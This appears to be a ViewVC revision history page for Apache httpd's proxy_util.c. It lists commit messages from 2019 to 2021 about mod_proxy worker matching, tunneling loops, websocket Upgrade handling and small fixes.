- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1891216)

Modified
*Fri Jul 2 22:09:10 2021 UTC*
(3 years, 6 months ago)
by *ylavic*

File length: 180176 byte(s)

Diff to [previous 1891206](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1891206&r2=1891216)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1891206&r2=1891216&diff_format=h))
```
mod_proxy: Follow up to [r1891206](/viewvc?view=revision&revision=1891206): fix UDS scheme.

```

---

Revision [**1891206**](/viewvc?view=revision&revision=1891206) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1891206&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1891206&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1891206))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1891206)

Modified
*Fri Jul 2 14:58:46 2021 UTC*
(3 years, 6 months ago)
by *ylavic*

File length: 180160 byte(s)

Diff to [previous 1891148](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1891148&r2=1891206)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1891148&r2=1891206&diff_format=h))
```
mod_proxy: Fix possible reuse/merging of Proxy(Pass)Match workers.  PR 65419.

We can't truncate ProxyMatch's worker name/url to the first '$' substitution
without possibly colliding with other workers. This also makes the matching
done at runtime by ap_proxy_strcmp_ematch() completely pointless.

To fix this and still address [r1878467](/viewvc?view=revision&revision=1878467) (i.e. make <http://host:port>$1 a "valid"
URL), we need to remove '$' substitutions from the :port part of the URL only
since it's allowed anywhere else by apr_uri_parse().

So let's strip them before apr_uri_parse() and prepend them back in the path
before apr_uri_unparse() to restore the original URL. Non-matchable workers are
not concerned so ap_proxy_define_worker() is made a local helper (w/o the ap_
prefix) which takes "matchable" as argument and can then be called by both
ap_proxy_define_[match_]worker() functions.

```

---

Revision [**1891148**](/viewvc?view=revision&revision=1891148) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1891148&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1891148&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1891148))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1891148)

Modified
*Tue Jun 29 21:16:21 2021 UTC*
(3 years, 6 months ago)
by *ylavic*

File length: 178137 byte(s)

Diff to [previous 1889550](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1889550&r2=1891148)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1889550&r2=1891148&diff_format=h))
```
core: Write Completion (WC) bucket type.

A WC bucket is meant to prevent buffering/coalescing filters from retaining
data, but unlike a FLUSH bucket it won't cause the core output filter to
block trying to flush anything before.

It can be passed by async handlers which want to never block, followed by
ap_filter_should_yield() to check for pending data and eventually suspend
processing until MPM/asynchronous write completion finishes.

In this commit it's used that way by the tunneling loop of mod_proxy to
prevent SSL coaslescing.

gh: closes #200

```

---

Revision [**1889550**](/viewvc?view=revision&revision=1889550) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1889550&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1889550&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1889550))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1889550)

Modified
*Thu May 6 06:25:09 2021 UTC*
(3 years, 8 months ago)
by *jfclere*

File length: 178279 byte(s)

Diff to [previous 1887720](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1887720&r2=1889550)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1887720&r2=1889550&diff_format=h))
```
Allow the tunnelled connections to report the
read and trasnfered to the back-end worker.

```

---

Revision [**1887720**](/viewvc?view=revision&revision=1887720) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1887720&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1887720&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1887720))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1887720)

Modified
*Tue Mar 16 12:55:18 2021 UTC*
(3 years, 10 months ago)
by *jorton*

File length: 177967 byte(s)

Diff to [previous 1885239](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1885239&r2=1887720)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1885239&r2=1887720&diff_format=h))
```
* modules/proxy/proxy_util.c (ap_proxy_define_balancer):
  Fix leak in error path in the do_malloc case, caught by covscan.

```

---

Revision [**1885239**](/viewvc?view=revision&revision=1885239) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1885239&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1885239&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1885239))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1885239)

Modified
*Thu Jan 7 13:19:08 2021 UTC*
(4 years ago)
by *ylavic*

File length: 177891 byte(s)

Diff to [previous 1884280](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1884280&r2=1885239)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1884280&r2=1885239&diff_format=h))
```
mod_proxy_wstunnel: leave Upgrade requests handling to mod_proxy_http.

Let mod_proxy_http's canon and scheme handlers accept "ws[s]:" schemes so that
mod_proxy_wstunnel can decline requests when mod_proxy_http is loaded.

* modules/proxy/{mod_proxy.h,proxy_util.c} (ap_proxy_worker_can_upgrade):
  Add a "dflt" argument to ap_proxy_worker_can_upgrade() which, if not NULL,
  is matched when no worker upgrade= parameter is configured. This allows to
  handle the default "Upgrade: websocket" case for "ws[s]:" schemes.

* modules/proxy/mod_proxy_http.c (proxy_http_canon, proxy_http_handler):
  Add and use the new get_url_scheme() helper to parse URL schemes handled by
  mod_proxy_http and use it in canon and scheme handlers. This helper now
  accepts ws[s] schemes.

* modules/proxy/mod_proxy_wstunnel.c (proxy_wstunnel_post_config):
  New post_config hook to detect whether mod_proxy_http is loaded and set
  global fallback_to_mod_proxy_http flag in this case.

* modules/proxy/mod_proxy_wstunnel.c (proxy_wstunnel_check_trans,
                                      proxy_wstunnel_canon,
                                      proxy_wstunnel_handler):
  These hooks now early return DECLINED if fallback_to_mod_proxy_http is set.

```

---

Revision [**1884280**](/viewvc?view=revision&revision=1884280) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1884280&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1884280&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1884280))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1884280)

Modified
*Thu Dec 10 16:04:34 2020 UTC*
(4 years, 1 month ago)
by *ylavic*

File length: 177661 byte(s)

Diff to [previous 1884067](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1884067&r2=1884280)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1884067&r2=1884280&diff_format=h))
```
Revert [r1480058](/viewvc?view=revision&revision=1480058), -1'ed on dev@ and STATUS.

Never backported (and never will supposedly), while often creating
merge conflicts.

See <https://lists.apache.org/thread.html/be0e7bdc3510fddd2dd80accece44917eba361ef4fcc713dd0f7f7fa%401367999236%40%3Cdev.httpd.apache.org%3E>
and <https://lists.apache.org/thread.html/6e63271b308a2723285d288857318e7bb51b6756690514d9bc75a71b%401371148914%40%3Ccvs.httpd.apache.org%3E>

```

---

Revision [**1884067**](/viewvc?view=revision&revision=1884067) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1884067&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1884067&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1884067))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1884067)

Modified
*Thu Dec 3 14:06:17 2020 UTC*
(4 years, 1 month ago)
by *ylavic*

File length: 177573 byte(s)

Diff to [previous 1883744](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1883744&r2=1884067)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1883744&r2=1884067&diff_format=h))
```
mod_proxy: provide prefetching and spooling mechanisms to all proxy modules.

Export ap_proxy_prefetch_input(), ap_proxy_spool_input() and
ap_proxy_read_input() from mod_proxy_http to mod_proxy.h/proxy_util.c so
that they are usable by all proxy modules.

mod_proxy_fcgi will use them in a following commit.

```

---

Revision [**1883744**](/viewvc?view=revision&revision=1883744) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1883744&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1883744&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1883744))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1883744)

Modified
*Mon Nov 23 11:03:45 2020 UTC*
(4 years, 2 months ago)
by *ylavic*

File length: 166821 byte(s)

Diff to [previous 1881790](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1881790&r2=1883744)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1881790&r2=1883744&diff_format=h))
```
mod_proxy: pconf vs pchild consistency, and correctness in ONE_PROCESS mode.

Consistently use pconf for ap_proxy_define_{worker,balancer}() and pchild for
ap_proxu_initialize_{worker,balancer}() in mod_proxy [child_]init code.

pchild is needed in _initialize() for mutexes/shms' child_init and cleanup,
and to avoid a crash on shutdown (i.e. ap_terminate) in ONE_PROCESS mode,
where worker->cp->pool is destroyed twice, let's register conn_pool_cleanup()
as a pre_cleanup of pchild.

```

---

Revision [**1881790**](/viewvc?view=revision&revision=1881790) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1881790&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1881790&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1881790))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1881790)

Modified
*Thu Sep 17 11:31:43 2020 UTC*
(4 years, 4 months ago)
by *jorton*

File length: 166894 byte(s)

Diff to [previous 1880200](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1880200&r2=1881790)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1880200&r2=1881790&diff_format=h))
```
mod_proxy: Add support for an optional third argument to ProxyRemote*
to configure the Basic auth credentials to send to the remote proxy.

(Note that credentials are always sent w/o waiting for a challenge as
with proxy-chain-auth, and only Basic is supported - both of which are
not exactly ideal - but better than nothing.)

* modules/proxy/mod_proxy.h (struct proxy_remote): Add creds field.

* modules/proxy/mod_proxy.c (proxy_handler): Pass forward proxy
  credentials via r->notes.
  (add_proxy): Take credentials and base64-encode into ->creds field if
  passed.
  (add_proxy_noregex, add_proxy_regex): Take optional creds argument.

* modules/proxy/proxy_util.c (ap_proxy_determine_connection):
  Use proxy credentials from r->notes if available.
  (ap_proxy_create_hdrbrgd): Set Proxy-Authorization header from
  credentials in r->notes if present.

PR: 37355
Github: closes #135

```

---

Revision [**1880200**](/viewvc?view=revision&revision=1880200) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1880200&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1880200&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1880200))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1880200)

Modified
*Thu Jul 23 12:00:04 2020 UTC*
(4 years, 6 months ago)
by *ylavic*

File length: 166506 byte(s)

Diff to [previous 1879416](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1879416&r2=1880200)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1879416&r2=1880200&diff_format=h))
```
mod_proxy: follow up to [r1879401](/viewvc?view=revision&revision=1879401): call filters on tunnel POLLERR.

proxy_util.c:
    Set POLLERR in reqevents for pollset providers that require it to detect
    socket errors (like select() based one).
    Call filters to read/write on POLLERR socket event, so that they know about
    the error by experiencing the failure. If no POLLIN|POLLOUT is returned
    with POLLERR (depending on the system or pollset provider), go with the
    requested read or write event handling.
    Restore ap_proxy_transfer_between_connections() so that it always tries to
    read first (i.e. move yielding conditions afterward).
    Add proxy_tunnel_forward() helper that calls transfer_between_connections()
    and handles errors pollset updates.
    Call proxy_tunnel_forward() when write completion finishes and there are
    pending input data.

mod_proxy.h:
    Add read_buf_size to proxy_tunnel_rec (trunk only, no MMN minor bump).

```

---

Revision [**1879416**](/viewvc?view=revision&revision=1879416) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1879416&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1879416&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1879416))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1879416)

Modified
*Wed Jul 1 23:16:04 2020 UTC*
(4 years, 6 months ago)
by *ylavic*

File length: 165572 byte(s)

Diff to [previous 1879402](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1879402&r2=1879416)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1879402&r2=1879416&diff_format=h))
```
mod_ssl: release coalesced data when called from ap_filter_output_pending().

The purpose of ap_filter_output_pending() is to flush pending data, so
ssl_io_filter_coalesce() should honor that.

This allows mod_proxy to not care about mod_ssl coalescing filters when
tunneling between connections.

```

---

Revision [**1879402**](/viewvc?view=revision&revision=1879402) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1879402&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1879402&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1879402))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1879402)

Modified
*Wed Jul 1 16:44:15 2020 UTC*
(4 years, 6 months ago)
by *ylavic*

File length: 165855 byte(s)

Diff to [previous 1879401](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1879401&r2=1879402)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1879401&r2=1879402&diff_format=h))
```
mod_proxy: reindent ap_proxy_transfer_between_connections() after [r1879401](/viewvc?view=revision&revision=1879401).

No functional change.

```

---

Revision [**1879401**](/viewvc?view=revision&revision=1879401) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1879401&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1879401&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1879401))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1879401)

Modified
*Wed Jul 1 16:35:48 2020 UTC*
(4 years, 6 months ago)
by *ylavic*

File length: 166051 byte(s)

Diff to [previous 1879000](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1879000&r2=1879401)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1879000&r2=1879401&diff_format=h))
```
mod_proxy: improved and reentrant tunneling loop.

modules/proxy/mod_proxy.h:
    Rename AP_PROXY_TRANSFER_SHOULD_YIELD to AP_PROXY_TRANSFER_YIELD_PENDING
    and add AP_PROXY_TRANSFER_YIELD_MAX_READS.

modules/proxy/mod_proxy_http.c:
modules/proxy/mod_proxy_wstunnel.c:
    Removing of reqtimeout filter is now handled by ap_proxy_tunnel_create().

modules/proxy/proxy_util.c:
    ap_proxy_transfer_between_connections():
        Reorganize loop to break out early.
        When AP_PROXY_TRANSFER_YIELD_PENDING, if !ap_filter_should_yield() we
        still need to run and check ap_filter_output_pending() since it may
        release pending data.
        When AP_PROXY_TRANSFER_YIELD_MAX_READS, stop the loop after too much
        reads (PROXY_TRANSFER_MAX_READS = 10000) to release the thread and
        give the caller a chance to schedule the other direction.
        Don't return APR_INCOMPLETE when it comes from an incomplete body
        detected by ap_http_filter().

    ap_proxy_tunnel_create():
        Start with POLLOUT on both directions so that any pending output data
        is flushed first.

    ap_proxy_tunnel_run():
        Remove re-init/clear of the pollset for each call so that the function
        is reentrant.
        Handle POLLOUT before POLLIN so that we can read in the same pass once
        all buffered output data are flushed, using ap_filter_input_pending()
        to drain buffered input data.

This is preparatory patch for async websocket tunneling is mod_proxy_http.

```

---

Revision [**1879000**](/viewvc?view=revision&revision=1879000) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1879000&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1879000&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1879000))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1879000)

Modified
*Fri Jun 19 17:30:24 2020 UTC*
(4 years, 7 months ago)
by *ylavic*

File length: 163930 byte(s)

Diff to [previous 1878994](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1878994&r2=1879000)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1878994&r2=1879000&diff_format=h))
```
ap_proxy_define_match_worker: disable connection reuse by default.

To avoid compat issues with dns/connection reuse now that a worker with
dollar substitution can be elected.

```

---

Revision [**1878994**](/viewvc?view=revision&revision=1878994) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1878994&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1878994&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1878994))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1878994)

Modified
*Fri Jun 19 15:39:33 2020 UTC*
(4 years, 7 months ago)
by *ylavic*

File length: 163458 byte(s)

Diff to [previous 1878467](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1878467&r2=1878994)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1878467&r2=1878994&diff_format=h))
```
ap_proxy_define_match_worker: don't copy the url unnecessarily.

And save a few cycles, when the duplication is needed, by not copying
the ignored part.

```

---

Revision [**1878467**](/viewvc?view=revision&revision=1878467) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1878467&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1878467&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1878467))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1878467)

Modified
*Thu Jun 4 08:40:10 2020 UTC*
(4 years, 7 months ago)
by *jfclere*

File length: 163455 byte(s)

Diff to [previous 1877728](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1877728&r2=1878467)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1877728&r2=1878467&diff_format=h))
```
make sure the $n of the regular expressions is not included the name of the worker.
for example,  the example:
ProxyPassMatch "^(/.*\.gif)$" "<http://backend.example.com:8000>$1"
was giving:
AH00526: Syntax error on line nnn of bla/conf/httpd.conf:
ProxyPass Unable to parse URL: <http://backend.example.com:8000>$1

```

---

Revision [**1877728**](/viewvc?view=revision&revision=1877728) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1877728&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1877728&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1877728))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1877728)

Modified
*Thu May 14 09:02:13 2020 UTC*
(4 years, 8 months ago)
by *ylavic*

File length: 163323 byte(s)

Diff to [previous 1877646](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1877646&r2=1877728)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1877646&r2=1877728&diff_format=h))
```
mod_proxy: binary search for ProxyErrorOverride status codes.

The list can be rather long, speed up runtime by sorting the status codes in
error_override_codes and using binary search from ap_proxy_should_override().

```

---

Revision [**1877646**](/viewvc?view=revision&revision=1877646) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1877646&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1877646&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1877646))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1877646)

Modified
*Tue May 12 12:20:57 2020 UTC*
(4 years, 8 months ago)
by *ylavic*

File length: 162958 byte(s)

Diff to [previous 1876599](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1876599&r2=1877646)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1876599&r2=1877646&diff_format=h))
```
mod_proxy_http: handle Upgrade requests and upgraded protocol forwarding.

If the request Upgrade header matches the worker upgrade= parameter and
the backend switches the protocol, do the tunneling in mod_proxy_http.
This allows to keep the protocol to HTTP until the backend really
switches the protocol, and apply usual output filters.

When configured to forward Upgrade mechanism, we want the backend to be
able to announce its Upgrade protocol to the client (e.g. with 426
Upgrade Required response) and thus forward back the Upgrade header that
matches the one(s) configured in the worker upgrade= parameter.

modules/proxy/mod_proxy.h:
modules/proxy/proxy_util.c:
    ap_proxy_worker_can_upgrade(): added helper to determine whether a
    proxy worker is configured to forward an Upgrade protocol.

include/ap_mmn.h:
    Bump MMN minor for ap_proxy_worker_can_upgrade().

modules/proxy/mod_proxy.c:
    set_worker_param(): handle worker parameter upgrade=ANY as upgrade=*
    (should the "any" protocol scheme be something some day..).

modules/proxy/mod_proxy_wstunnel.c:
    proxy_wstunnel_handler(): use ap_proxy_worker_can_upgrade() to match
    the Upgrade header. Axe handling of upgrade=NONE, it makes no sense to
    Upgrade a connection if the client did not ask for it, nor to configure
    mod_proxy_wstunnel to use a worker with upgrade=NONE by the way.

modules/proxy/mod_proxy_http.c:
    proxy_http_req_t: add fields force10 (force HTTP/1.0) and upgrade (value
    of the Upgrade header sent by the client if it matches the configuration,
    NULL otherwise).
    proxy_http_handler(): use ap_proxy_worker_can_upgrade() to determine
    whether the request is electable for end to end protocol upgrading and set
    req->upgrade accordingly.
    terminate_headers(): handle Connection and Upgrade headers to send to the
    backend, according to req->force10 and req->upgrade set before.
    ap_proxy_http_prefetch(): use req->force10 and terminate_headers().
    send_continue_body(): added helper to send the body retained for end to
    end 100-continue handling.
    ap_proxy_http_process_response(): use ap_proxy_worker_can_upgrade() to
    match the response Upgrade header and forward it back if it matches the
    configured one(s). That is for 101 Switching Protocol obviously but also
    any other status code which is not overidden, at the backend wish. If the
    protocol is switching, create a proxy tunnel and run it, using the minimal
    timeout from the client or backend connection.

Github: closes #125

```

---

Revision [**1876599**](/viewvc?view=revision&revision=1876599) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1876599&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1876599&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1876599))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1876599)

Modified
*Thu Apr 16 12:32:33 2020 UTC*
(4 years, 9 months ago)
by *ylavic*

File length: 162489 byte(s)

Diff to [previous 1876404](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1876404&r2=1876599)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1876404&r2=1876599&diff_format=h))
```
Add missing pool tags to help debugging.

```

---

Revision [**1876404**](/viewvc?view=revision&revision=1876404) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1876404&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1876404&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1876404))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1876404)

Modified
*Sat Apr 11 21:19:08 2020 UTC*
(4 years, 9 months ago)
by *covener*

File length: 162398 byte(s)

Diff to [previous 1873985](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1873985&r2=1876404)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1873985&r2=1876404&diff_format=h))
```
PR63628: individual status codes for ProxyErrorOverride.

Support specifying the http status codes to be considered by ProxyErrorOverride

Submitted By: Martin Drößler <mail martindroessler.de>
Committed By: covener

```

---

Revision [**1873985**](/viewvc?view=revision&revision=1873985) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1873985&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1873985&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1873985))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1873985)

Modified
*Thu Feb 13 18:15:57 2020 UTC*
(4 years, 11 months ago)
by *mrumph*

File length: 161775 byte(s)

Diff to [previous 1870991](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1870991&r2=1873985)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1870991&r2=1873985&diff_format=h))
```
Fix spelling errors found by codespell.  [skip ci]

```

---

Revision [**1870991**](/viewvc?view=revision&revision=1870991) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1870991&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1870991&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1870991))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1870991)

Modified
*Sat Dec 7 15:44:24 2019 UTC*
(5 years, 1 month ago)
by *jailletc36*

File length: 161776 byte(s)

Diff to [previous 1869420](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1869420&r2=1870991)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1869420&r2=1870991&diff_format=h))
```
Axe an empty line in order to synch with 2.4.x

```

---

Revision [**1869420**](/viewvc?view=revision&revision=1869420) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1869420&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1869420&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1869420))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1869420)

Modified
*Tue Nov 5 16:41:14 2019 UTC*
(5 years, 2 months ago)
by *ylavic*

File length: 161777 byte(s)

Diff to [previous 1869338](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1869338&r2=1869420)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1869338&r2=1869420&diff_format=h))
```
mod_proxy: Improve tunneling loop.

Support half closed connections and pending data draining (for protocols like
rsync). PR 61616.

When reading on one side goes faster than writing on the other side, the output
filters chain may start buffering data and finally block, which will break
bidirectional tunneling for some protocols.

To avoid this, proxy_tunnel_run() now stops polling/reading until pending data
are drained, and recovers appropriately.

```

---

Revision [**1869338**](/viewvc?view=revision&revision=1869338) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1869338&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1869338&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1869338))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1869338)

Modified
*Sun Nov 3 15:48:53 2019 UTC*
